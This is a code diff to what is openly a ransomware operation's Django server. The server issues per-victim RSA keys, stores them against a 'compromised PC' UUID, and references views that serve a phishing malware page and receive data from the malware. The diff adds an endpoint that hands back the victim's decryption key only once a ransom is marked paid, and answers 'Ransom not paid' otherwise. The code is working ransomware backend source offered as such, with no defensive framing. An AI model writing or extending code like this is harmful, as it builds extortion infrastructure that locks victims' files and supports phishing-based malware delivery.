@@ -8,7 +8,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 from django.views.decorators.csrf import csrf_exempt
-from base64 import b64encode
+from base64 import b64encode, b64decode
 from json import loads
 from uuid import uuid4, UUID
 from .models import Keys
@@ -18,9 +18,7 @@ def generate_keypair(request):
     if request.method == 'GET':
         if request.headers['api-key'] == 'secretkey' and not request.GET.get('uuid'):
             # Generate token for test (Comennt later)
-            secret_key_symetric = secrets.token_urlsafe(128)
-            print(secret_key_symetric)
-            
+            unique_email_token = secrets.token_urlsafe(199)            
             # Generate key pair
             rsa_key = RSA.generate(3072)
             private_rsa_key = rsa_key.export_key(
@@ -31,10 +29,10 @@ def generate_keypair(request):
             public_rsa_key = rsa_key.public_key().export_key()
             
             # Comment later 
-            print(private_rsa_key, public_rsa_key)
+            # print(private_rsa_key, public_rsa_key)
             
             uuid_number = str(uuid4())
-            key_store = Keys.objects.create(private_key=private_rsa_key, public_key=public_rsa_key, uuid_compromised_pc=uuid_number)
+            key_store = Keys.objects.create(private_key=private_rsa_key, public_key=public_rsa_key, uuid_compromised_pc=uuid_number, unique_email_token=unique_email_token)
             key_store.save()
             # ## Encrypt (Comment later)
             # rsa_key = RSA.importKey(public_rsa_key)
@@ -49,14 +47,15 @@ def generate_keypair(request):
             response = {"public_key" : public_rsa_key.decode(encoding='utf-8'), "uuid": uuid_number}
             return JsonResponse(response)
         elif request.headers['api-key'] == 'secretkey' and request.GET.get('uuid'):
+            # Validate UUID
             try:
                 uuid = UUID(request.GET.get('uuid'), version=4)
-            except ValueError:
+                key_store = Keys.objects.get(uuid_compromised_pc=uuid)
+                # print(key_store.uuid_compromised_pc)
+                return JsonResponse({"uuid": key_store.uuid_compromised_pc, "public_key": key_store.public_key.decode(encoding='utf8')})
+            except:
                 return HttpResponseNotFound("Not Found")
-            key_store = Keys.objects.get(uuid_compromised_pc=uuid)
 
-            print(key_store.uuid_compromised_pc)
-            return JsonResponse({"uuid": key_store.uuid_compromised_pc, "public_key": key_store.public_key.decode(encoding='utf8')})
     return HttpResponseNotFound("Not Found")
 
 def serve_malware_page_phishing(request):
@@ -80,6 +79,27 @@ def receive_json_from_malware(request):
             return HttpResponseNotFound('Not Found')
     return HttpResponseNotFound('Not Found')
 
+        
+def recieve_private_key(request):
+    if request.method == 'GET':
+        try:
+            uuid = UUID(request.GET.get('uuid'), version=4)
+            key_store = Keys.objects.get(uuid_compromised_pc=uuid)
+        except ValueError:
+            return HttpResponseNotFound("Not Found")
+        
+        if key_store.paid_status == False:
+            return HttpResponseNotFound("Ransom not paid")
+        
+        if request.GET.get("uniqueToken", None) == key_store.unique_email_token and key_store.paid_status == True:
+            private_rsa_key = key_store.private_key
+            encrypted_sim_key = b64decode(key_store.encrypted_symetric_key)
+            print(encrypted_sim_key)
+            rsa_key = RSA.importKey(private_rsa_key)
+            cipher = PKCS1_OAEP.new(rsa_key)
+            cipher_decrypt_key = cipher.decrypt(encrypted_sim_key)
+            return JsonResponse({"sim_key": cipher_decrypt_key.decode(encoding='utf8')})
+        
         
         
     
